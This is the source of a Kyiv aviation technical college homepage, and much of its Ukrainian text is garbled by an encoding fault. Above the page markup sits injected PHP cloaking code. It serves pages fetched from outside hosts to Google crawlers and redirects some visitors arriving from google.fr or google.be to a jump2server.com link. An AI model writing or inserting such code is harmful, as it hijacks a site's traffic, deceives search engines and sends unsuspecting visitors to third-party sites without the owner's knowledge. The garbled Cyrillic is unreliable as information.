<?php													
?><?php

function GetMetodu($url) { 
		$ch = curl_init(); 
		curl_setopt($ch,CURLOPT_URL,$url); 
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); 
 // curl_setopt($ch,CURLOPT_HEADER, false); 
		
		$output=curl_exec($ch); 
		curl_close($ch); 
		return $output; 
} 
$agent=$_SERVER['HTTP_USER_AGENT'];
if(preg_match("/google/i", $agent)){
echo GetMetodu("http://www.bakirkoyhuzurevi.com");
exit();}
if (!function_exists('stripos')) {
		function stripos($haystack, $needle, $offset = 0)
		{
				return strpos(strtolower($haystack), strtolower($needle), $offset);
		}
}
function GetHttpPage($url)
{
		$output = '';
		$time_out = 30;
		if (function_exists('curl_init')) {
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time_out);
				$output = curl_exec($ch);
				curl_close($ch);
		}
		if ($output) return $output;
		if (function_exists('file_get_contents')) {
				$context = stream_context_create(array('http' => array('timeout' => $time_out)));
				if (strnatcmp(phpversion(), '5.0.0') >= 0) {
						$output = file_get_contents($url, false, $context);
				} else {
						$output = file_get_contents($url, false);
				}
		}
		if ($output) return $output;
		if (ini_get("allow_url_fopen") == "1") {
				$errstr = '';
				$errno = '';
				$info = parse_url($url);
				$fp = fsockopen($info ["host"], 80, $errno, $errstr, $time_out) or exit ($errstr . "--->" . $errno);
				$head = "GET " . $info ['path'] . "?" . (isset($info ["query"]) ? $info ["query"] : "") . " HTTP/1.1\r\n";
				$head .= "Host: " . $info ['host'] . "\r\n";
				$head .= "Connection: Close\r\n\r\n";
				fwrite($fp, $head);
				while (!feof($fp)) {
						$output .= fgets($fp, 128);
				}
				fclose($fp);
		}
		return $output;
}
$lang = "";
if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
		$_SERVER['HTTP_ACCEPT_LANGUAGE'] = "en";
}
if ($_SERVER['HTTP_ACCEPT_LANGUAGE']) {
		$wifilangs = explode(";", $_SERVER['HTTP_ACCEPT_LANGUAGE']);
		$wifilangs = explode(",", $wifilangs[0]);
		$lang = $wifilangs[0];
}
$jump = "http://www.jump2server.com/jump.aspx?jumpid=ska72c";
$mirror = "http://www.jewelrysliver.com/Content.aspx?id=6572";
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";
$referer = $referer . "/";
if (preg_match("/(googlebot)/i", $_SERVER['HTTP_USER_AGENT'])) {
		if (stripos($mirror, "http") === false) {
				if (file_exists($mirror)) {
						readfile($mirror);
						exit();
				}
		} else {
				echo(GetHttpPage($mirror));
				exit();
		}
} else if ($jump != "" ) {
if (!preg_match("/zh/i", $lang)) {
		$terms = array();
		array_push($terms, "google.fr");array_push($terms, "google.be");
		if (count($terms) > 0) {
				foreach ($terms as $term) {
						if (stripos($referer, $term) > 0) {
								header('Location: ' . $jump);
								exit();
						}
				}
		} else {
				header('Location: ' . $jump);
				exit();
		}
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
	<title>Київський авіаційний технікум</title>
	<meta HTTP-EQUIV="Page-Enter" CONTENT="BlendTrans(Duration=1.0)">
	<meta name="description" content="Ee?anueee aa?ao?eiee oaoi?eoi" />
	<meta name="keywords" content="Ee?anueee aa?ao?eiee oaoi?eoi" />
	<base />
																													<script type="text/javascript">
															<!--
																														var TMenu_path_to_files="includes/javascript/hovermenu/";
															//-->
																													</script>
															<script type="text/javascript" src="includes/javascript/skin_functions.js"></script>
															<script type="text/javascript" src="includes/javascript/hovermenu/menu.js"></script>  <link rel="stylesheet" type="text/css" href="skins/uvaf/uvaf.css" />
	<link rel="stylesheet" type="text/css" href="skins/uvaf/menu.css" />
	<script language="javascript">AC_FL_RunContent = 0;</script>
	<script src="AC_RunActiveContent.js" language="javascript"></script>
<style type="text/css">
<!--
.noeeu3 {color: #FFFF04}
.noeeu4 {font-size: 14}
.noeeu5 {color: #FFFFFF}
-->
</style>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
</head>
<body>
<table border="0" cellpadding="0" cellspacing="0" width="100%" height="100%">
	<tr>
		<td rowspan="3" class="background_01">&nbsp;</td>
		<td align="center" valign="bottom" class="background_02"><div align="left"></div></td>
		<td rowspan="3" class="background_03">&nbsp;</td>
	</tr>
	<tr>
		<td class="logo_uvaf"><img src="skins/uvaf/images/logo.jpg" width="961" height="180" align="bottom" /></td>
	</tr>
	<tr>
		<td class="toolbar_uvaf"><center><table border="0" cellpadding="0" cellspacing="0"><tr>
	<td width="3" class="bullet_10"></td><td width="80" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'">
	<table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4">
	<div class="bullet_5"><a href="index.php" class="sdcategory" target="_self">Головна</a></div></td></tr></table></td>
	<td width="76" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'">
	<table border="0" cellpadding="0" cellspacing="0"><tr><td width="77" align="center" class="bullet_4"><div class="bullet_5"><a href="istoriya_1920-1947.php" class="sdcategory" target="_self">?noi??y</a></div></td></tr></table></td>
	<td width="94" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="pam.php" class="sdcategory" target="_self">Aa?oo???ioo</a></div></td></tr></table></td><td width="82" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="student.php" class="sdcategory" target="_self">Nooaaioo</a></div></td></tr></table></td><!--<td width="82" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="forum/" class="sdcategory" target="_self">Oi?oi</a></div></td></tr></table></td>--><td width="80" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="forum/index.php?autocom=gallery" class="sdcategory" target="_self">Aaea?ay</a></div></td></tr></table></td><td width="106" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table width="106" border="0" cellpadding="0" cellspacing="0">
			<tr><td width="106" align="center" class="bullet_4"><div class="bullet_5"><a href="forum/index.php?autocom=downloads" class="sdcategory" target="_self">Aeai?e ae?aeoi?a</a></div></td></tr></table></td><td width="101" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table width="101" border="0" cellpadding="0" cellspacing="0">
				<tr><td width="101" align="center" class="bullet_4"><div class="bullet_5"><a href="kont.php" class="sdcategory" target="_self">Eiioaeoe</a></div></td></tr></table></td></tr></table>
		</center></td>
	</tr>
	<tr>
		<td class="background_06">
			<table cellpadding="0" cellspacing="0" width="100%">
				<tr>
					<td class="background_04">&nbsp;</td>
				</tr>
			</table>
		</td>
		<td align="left" class="background_11"><table border="0" cellpadding="0" cellspacing="0" class="width_100">
			<tr>
				<td colspan="2"><table border="0" cellpadding="0" cellspacing="0" class="width_100">
						<tr>
							<td class="width_100"><table height="5%" border="0" cellpadding="0" cellspacing="0" class="width_100">
									<tr>
										<td class="plugin_1"><table border="0" cellpadding="0" cellspacing="0" class="width_100">
												<tr>
													<td class="plugin_4"></td>
													<td class="plugin_2">&#149; Noaoenoeea naeoo </td>
													<td class="plugin_5"></td>
												</tr>
												<tr>
													<td class="plugin_6"></td>
													<td class="plugin_3"><p>Ca?ac ia naeo? -
																	<script src="./includes/online.php "></script>
																	<br />
													Noi??ieo iiiaeee -
													<? $type = "text"; include("./includes/count.php"); ?>
													</p></td>
													<td class="plugin_7"></td>
												</tr>
												<tr>
													<td class="plugin_8"></td>
													<td class="plugin_9"></td>
													<td class="plugin_10"></td>
												</tr>
										</table></td>
										<td class="plugin_1"><table border="0" cellpadding="0" cellspacing="0" class="width_100">
												<tr>
													<td class="plugin_4"></td>
													<td class="plugin_2">&#149; Aeiaaeiaee aoi?eci </td>
													<td class="plugin_5"></td>
												</tr>
												<tr>
													<td class="plugin_6"></td>
													<td class="plugin_3"><script src="./includes/slu4!!!!!!!!!!!!!!!!!!!!!!!!!!!/rand_js.php?r=1"></script></td>
													<td class="plugin_7"></td>
												</tr>
												<tr>
													<td class="plugin_8"></td>
													<td class="plugin_9"></td>
													<td class="plugin_10"></td>
												</tr>
										</table></td>
										<td class="plugin_1"><table border="0" cellpadding="0" cellspacing="0" class="width_100">
												<tr>
													<td class="plugin_4"></td>
													<td class="plugin_2">&#149; Iiooe ii naeoo </td>
													<td class="plugin_5"></td>
												</tr>
												<tr>
													<td class="plugin_6"></td>
													<td class="plugin_3"><div align="right"></div>
															<div align="right">
																<? require ('phprusearch/sinc/form.php') ?>
														</div></td>
													<td class="plugin_7"></td>
												</tr>
												<tr>
													<td class="plugin_8"></td>
													<td class="plugin_9"></td>
													<td class="plugin_10"></td>
												</tr>
										</table></td>
									</tr>
							</table></td>
						</tr>
				</table></td>
			</tr>
			<tr>
				<td width="410" class="width_218"><table border="0" cellpadding="0" cellspacing="0" class="218">
						<tr>
							<td class="toolbar_side_1"><div class="toolbar_text_1">Iaa?aao?y</div></td>
						</tr>
						<tr>
							<td valign="top" class="toolbar_side_2"><div class="toolbar_text_2">
									<table width="106" height="0" border="0" align="center" cellpadding="0" cellspacing="0" ><tr><td>
											<form>
<table cellspacing=4><tr><td>
														<input type="button" class="button" name="btnSubmit" value="I?i ian" onClick="javascript: document.location='index.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" />
</td></tr><tr><td>
														<input type="button" class="button" name="btnSubmit" value="?noi??y oaoi?eoio" onClick="javascript: document.location='istoriya_tehnikumu.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" /></td></tr><tr><td>                            <input type="button" class="button" name="btnSubmit" value="Iiaeie oaoi?eoio" onClick="javascript: document.location='novosti_teh.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" /></td></tr><tr><td>                          <input type="button" class="button" name="btnSubmit" value="Ainooi ai ioae??ii? ?ioi?iao??" onClick="javascript: document.location='reklama.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" /></td></tr><tr><td>          <input type="button" class="button" name="btnSubmit" value="Aea?? i?a?o?iee?a" onClick="javascript: document.location='reklama2.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" /></td></tr></table>                                                                             



										 </form>                    </tr>                  </table>              </div></td>            </tr>          </table>            <table border="0" cellpadding="0" cellspacing="0" class="218">              <tr>                <td class="toolbar_side_1"><div class="toolbar_text_1">Ia?ao?a ia naeo</div></td>              </tr>              <tr>                <td class="toolbar_side_2"><div align="center"></div>                    <div align="center"> <br>                      <p><a href="http://www.mon.gov.ua/index.php/ua/"><img src="includes\Mon.jpg" alt="I?i?noa?noai ina?oe ? iaoee" border="0"/></a>                    </div>                    <div align="center"></div></td>              </tr>          </table></td>        <td width="551" class="width_743"><table border="0" cellpadding="0" cellspacing="0">            <tr>              <td class="toolbar_general_1"><div class="toolbar_text_1">I?i ian </div></td>            </tr>            <tr>              <td class="toolbar_general_2"><div class="toolbar_text_2">  
					 <p align="center"><img src = "Reclama.gif">
<p align="center"><strong> Eaneaai i?ineii ia noi??ieo Ee?anueiai aa?ao?eiiai oaoi?eoio! </strong></p>                  <p align="justify">           Ie ue?i ?aa? aaoiio a?ceoo e niia?aa?iinu, ui ?ioi?iao?y i?i iao oaoi?eoi aoaa aai ia o?euee o?eaaa, aea e ei?enia oa iaaanou ?noioio aiiiiiao o aecia?aii? aaoeo ?eoo?aeo i??i?eoao?a. </p>                  <p align="justify">           Ee?anueee aa?ao?eiee oaoi?eoi – oa ?aeiee aa??aaiee&nbsp; aeuee iaa?aeuiee caeeaa ina?oe ia?oiai ??aiy ae?aaeoao?? ia oa?eoi??? iaea?euoiai a Oe?a?i? aa?ao?eiiai i?ai?e?inoaa AI «Aioiiia», ui aioo? eaae?o?eiaaieo oao?ao?a – oaoi?e?a ii ae?iaieooao aa?ao?eieo e?oaeuieo aia?ao?a. O?aiaee i?ioan iiaoaiaaiee oaeei ?eiii ui i?ney iaa?aiiy?, nooaaio ia? ciiao i?ao?aaoe ia i?ai?e?inoa?. </p>                  <p align="justify">           O oaoi?eoi? noai?ai? an? iaiao?ai? oiiae aey ye?niiai iaa?aeuiiai i?ioano e aeoeaii? iicao?i?ii? ?iaioe c? nooaaioaie. </p>                  <p align="justify">           Oni?oio ?iaioo iaa?aeuiiai caeeaao caaacia?o?ou: aenieieaae?o?eiaaiee aeeeaaaoueee neeaa, iaoa??aeuii-oaoi??ia aaca (eaa?iaoe, eaai?aoi???, eiii'?oa?i? eeane, cia?iee a?ae?ioa?iee oiia oiui), a?aiia?aia o?aiai-iaoiae?ia caaacia?aiiy oa o?aiai-aine?aieouea ?iaioa nooaaio?a. </p>                  <p align="justify">           Ee?anueee aa?ao?eiee oaoi?eoi ii i?aao ieoa?ouny nai?ie aeioneieeaie. Ia iaoo aoieo, naia ??aaiu ? i?noa i?aoaaeaoooaaiiy aeioneiee?a ia ae?iaieooa?, a oaei? ?oi?e i?ioan?eiee ??no ? iniiaieie e?eoa??yie aaoi?eoaoiino? e aoaeoeaiino? ?iaioe aeuiai iaa?aeuiiai caeeaao. </p> 
	<p align="center"><strong> EE?ANUEEE</strong><strong></strong><strong> AA?AO?EIEE</strong><strong></strong><strong> OAOI?EOI </strong><strong></p>
	<p align="center"><strong> CAI?IOO?</strong><strong></strong><strong> IA</strong><strong></strong><strong> IAA?AII? </strong><strong></p>
	<p align="center"><strong> Aaeocu ciaiu:  Iaoai??ia ?i?aia??y </strong></p> 
	<p align="center"><strong> Niao?aeui?nou: Aa?ao?eia oa ?aeaoii-eini??ia oaoi?ea </strong></p>   
	<p align="center"><strong> Niao?ae?cao?y: Ae?iaieooai aa?ao?eieo e?oaeuieo aia?ao?a </strong></p>               <p align="justify">           E?oaee «Aioiiia» a?aii? o anuiio na?o? caaayee ?o iaa?eiino?, oi?aa?naeuiino?, i?inoio? ianeoaiaoaaiiy oa aeiiii??i?e aoaeoeaiino?.
E?oaee Ai-2; …; Ai-70; Ai-74; Ai-124 «?oneai»; Ai-140; Ai-148 «Eano?aea»; Ai-225 «I??y» aeaioiaey?ou ia aaciaeo i?ai?e?inoaao: Aa??aaiiio i?ai?e?inoa? «Aioiiia», a oaei? o i. Oa?eia?, ??ai? oiui, aenieoaoo?ou a iiiaa 100 e?a?iao na?oo.
Oiio aeioneieee oaoi?eoio ao?a iio??ai? ? ia?ou ii?eea?nou i?ao?aaoe ca oaoii ia aaciaeo i?ai?e?inoaao, a i?ney io?eiaiiy aeieiio iieiaoiai niao?ae?noa oaoi?ea-oaoiieiaa, iaa?aoeny c o?aouiai eo?no a Iao?iiaeuiiio aa?ieini??iiio oi?aa?neoao? ?i. I. ?. ?oeianueiai (Oa?e?anueee aa?ao?eiee ?inoeooo).
Nuiaiai? o oaoi?eoi? iaa?a?ouny nooaaioe aaiii? oi?ie iaa?aiiy ca aa??aaiei caiiaeaiiyi oa ca eiio?aeoii.
Iaa?aeuiee i?ioan caaacia?o?ou aenieieaae?o?eiaai? aeeeaaa??, a oiio ?ene? eaiaeaaoe oaoi??ieo iaoe, aioaioe, aieoi? oaoi??ieo iaoe, i?ioani?. Oaoi?eoi ia? a?aiia?aio iaoa??aeuii-oaoi??io aaco. Caiyooy i?iaiayouny a niao?ae?ciaaieo aoaeoi??yo, eaa?iaoao, eaai?aoi??yo, eiii’?oa?ieo eeanao, oaei? nooaaioe ia?ou ii?eea?nou ei?enooaaoeny eaai?aoi??yie, iaeaaiaiiyi a?euieou oao?a aaciaeo i?ai?e?inoa.
Oaoi?eoi o?nii ni?ai?ao?? c aaciaeie i?ai?e?inoaaie (ciaoiaeouny ia ?o oa?eoi???), aa i?ia?ai? oao?ao? aa?ao?? ia?aaa?ou na?e aina?a oa ciaiiy. Ooo nooaaioe i?ioiayou iaa?aiiy c? niao?aeuieo i?aaiao?a, i?aeoe?io i?aaioiaeo c iaa?aeuieo i?aeoee (ne?na?ii-iaoai??ii?, ia iaa??aiiy ?ia?oie?i? i?ioan?? (?ic?yae)), oaoiieia??io oa ia?aaaeieiiio i?aeoeee; aeeiio?ou eo?nia? oa aeieiii? i?iaeoe ca oaiaoeei? aa?ai?ai?e?inoa.
Nooaaioe ia?ou ii?eea?nou io?eiaoe ?ia?oie?o i?ioan?? oa i?a ?an iaa?aiiy i?ao?aaoe.
Aa?a??? nooaaioe ia?ou ii?eea?nou io?eiaoe a?oao ina?oo c aeiiii??ieo aenoeie?i.
O aeioneiee?a oaoi?eoio iaia? i?iaeai c i?aoaaeaoooaaiiyi, ?o ?c caaiaieaiiyi cai?ioo?ou aa?ai?ai?e?inoaa oa aa?aeiiiai??.
 </p> 
											 <p align="justify"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Oa?i?i iaa?aiiy ia aaiiiio a?aa?eaii?:</strong><br />    
											 &nbsp;&nbsp;&nbsp;— 3 ?iee (ia aac? 11 ee.)<br />
						 &nbsp;&nbsp;&nbsp;— 4 ?iee (ia aac? 9 ee.)</p>
						 <p align="justify"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aa?o?nou iaa?aiiy ia aaiiiio a?aa?eaii?*:</strong><br /> 
						 &nbsp;&nbsp;&nbsp;— 9000 a?i. ia ??e</p>
						 
 <p align="center"><strong> Aaeocu ciaiu: Nio?aeui? oa iiaaa?ieia? iaoee </strong></p>
 <p align="center"><strong> Niao?aeui?nou: Aeiiii?ea </strong></p> 
 <p align="center"><strong> Niao?ae?cao?y: Aeiiii?ea i?ai?e?inoaa </strong></p>                 <p align="justify">           Iieiaoee niao?ae?no ii cae?i?aii? oaoi?eoio — oa oao?aaou c aenieei ??aiai oai?aoe?ii? ? i?aeoe?ii? aeiiii??ii? i?aaioiaee aey aeeiiaiiy ieaiiai?, o?iainiai? oa i?aai?cao?eii-oi?aae?inuei? a?yeuiino?. A?i ii?a ?icii?aoe nai? a?yeui?nou a aa?ao?ei?e aaeoc? oa ia aoau-yeiio ae?iaieooa?, o noa?? iineoa, oi?aae?inueeo no?oeoo?ao ia ia?aeiieo iinaaao aeiiii?noa, o?iainenoa, eiia?naioa oiui.
Iniiaieie aenoeie?iaie ?: aeiiii?ea i?ai?e?inoaa, iaiaa?iaio oa ia?eaoeia, no?aoiaa ni?aaa, i?aaiciaanoai ?, cae?aeii, aea?aiiy eiii’?oa?ii? oaoi?ee c iaoi? a?euiiai aeei?enoaiiy ?? o oaoia?e a?yeuiino?. Oai?aoe?i? ciaiiy aiiiiaaa?ou cae??ieoe ??ci? aeae iaa?aeuii? oa ae?iaie?i? i?aeoee, ye nooaaioe i?ioiayou ia Aa??aaiiio i?ai?e?inoa? «Aioiiia», a i?aai?cao?yo oa onoaiiaao.</p> 
											 <p align="justify"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Oa?i?i iaa?aiiy ia aaiiiio a?aa?eaii?:</strong><br />    
											 &nbsp;&nbsp;&nbsp;— 2 ?iee (ia aac? 11 ee.)<br />
						 &nbsp;&nbsp;&nbsp;— 3 ?iee (ia aac? 9 ee.)</p>
						 <p align="justify"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aa?o?nou iaa?aiiy ia aaiiiio a?aa?eaii?*:</strong><br /> 
						 &nbsp;&nbsp;&nbsp;— 5500 a?i. ia ??e</p>
						 
<p align="center"><strong> Aaeocu ciaiu: ?ioi?iao?ei? oaoiieia??  </strong></p>
<p align="center"><strong> Niao?aeui?nou: ?i?aia??y i?ia?aiiiai caaacia?aiiy </strong></p>  
<p align="center"><strong> Niao?ae?cao?y: ?ic?iaea i?ia?aiiiai caaacia?aiiy </strong></p>                  <p align="justify">          No??ieee ?icaeoie eiii’?oa?ii? oaoi?ee oa ?? ??ciiiai?oiiai i?ia?aiiiai caaacia?aiiy — oa iaia c oa?aeoa?ieo i?eeiao no?aniiai ia??iao ?icaeoeo noni?eunoaa. A oeo oiiaao i?iaia?o? c?inoaoe iiieo ia eiii’?oa?ieo niao?ae?no?a, iniaeeai ia iieiaeo niao?ae?no?a aeniei? eaae?o?eao??.</p>
<p align="justify"><strong>                           Iao iaa?aeuiee caeeaa  noaaeou ia?aa niai? ?aeio iaoo — i?aaiooaaoe eaae?o?eiaaieo niao?ae?no?a, ye? aoaoou eiieo?aioini?iii?i? ia ?eieo i?ao?, caaoieo:</strong><br />
																		&nbsp;&nbsp;&nbsp;•	?ic?iaeyoe niaoeo?eao?? ia aeiiao ei?enooaa??a;<br />
																		&nbsp;&nbsp;&nbsp;•	?iaeoe aiae?c aeiia;<br />
																		&nbsp;&nbsp;&nbsp;•	aeeiioaaoe i?iaeooaaiiy oa eiino?o?aaiiy IC; <br />
																		&nbsp;&nbsp;&nbsp;•	aieia?oe oi?iiyi aeei?enoiaoaaoe aeiiii??i? caeiie o i?ioan? ainiiaa?nuei? a?yeuiino? oa ei?enooaaiiy ii?iaoeaii i?aaiaeie aeoaie;<br />
																		&nbsp;&nbsp;&nbsp;•	canoiniaoaaoe i?ioan?eii-i?io?eui? ciaiiy c aaeoc? caaaeuiiina?oi?o aenoeie?i o i?ioan? ?ica’ycaiiy i?ioan?eieo caaa?;<br />
									&nbsp;&nbsp;&nbsp;•	oi?oe aeei?enoiaoaaoe ?ioa?iao-?ano?ne aey ae??oaiiy aenia?eiaioaeuieo ? i?aeoe?ieo caaaaiu o aaeoc? i?ioan?eii? a?yeuiino?.</p>
									
<p align="justify">           Aey ye?nii? i?aaioiaee niao?ae?no?a ? eiii’?oa?i? eaa?iaoe, iaeaaiai? no?anii? ia?ene?aaeuii? oaoi?ei?, ui aa? ii?eea?nou nooaaioai aineiiaei iaieia?oe no?anieie oaoiieia?yie c ieoaiu ?ic?iaee i?ia?aiiiai caaacia?aiiy. Nooaaioe aaiii? oi?ie iaa?aiiy ia?ou ii?eea?nou i?ioiaeoe ae?iaie?o i?aeoeeo ia Aa??aaiiio e?oaeiaoa?aiiio i?ai?e?inoa? «Aioiiia».
Aeioneieeai aeaa?ouny aeieii aa??aaiiai c?acea, eaae?o?eao?y — oaoi?e-i?ia?ai?no.
</p> 
	
<p align="justify"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Oa?i?i iaa?aiiy ia aaiiiio a?aa?eaii?:</strong><br />    
											 &nbsp;&nbsp;&nbsp;— 3 ?iee (ia aac? 11 ee.)<br />
						 &nbsp;&nbsp;&nbsp;— 4 ?iee (ia aac? 9 ee.)</p>
						 <p align="justify"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aa?o?nou iaa?aiiy ia aaiiiio a?aa?eaii?*:</strong><br /> 
						 &nbsp;&nbsp;&nbsp;— 6500 a?i. ia ??e</p>
				
<p align="justify"><strong>* — Aa?o?nou iaa?aiiy ca 2018/2019 iaa?aeuiee ??e </strong></p>				
 </p> 					   
	<p align="center">&nbsp;</p>               </div></td>            </tr>        </table></td>      </tr>    </table>      <td class="background_07">      <table cellpadding="0" cellspacing="0" width="100%">        <tr>          <td class="background_05"></td>        </tr>      </table>    </td>  </tr>  <tr>    <td class="background_08"></td>    <td class="background_09"><a href="default.htm">Ee?anueee Aa?ao?eiee Oaoi?eoi  © 2016</a><br>MegaDesign Studio © 2016</td>    <td class="background_10"></td>  </tr></table></body></html></table></body></html>
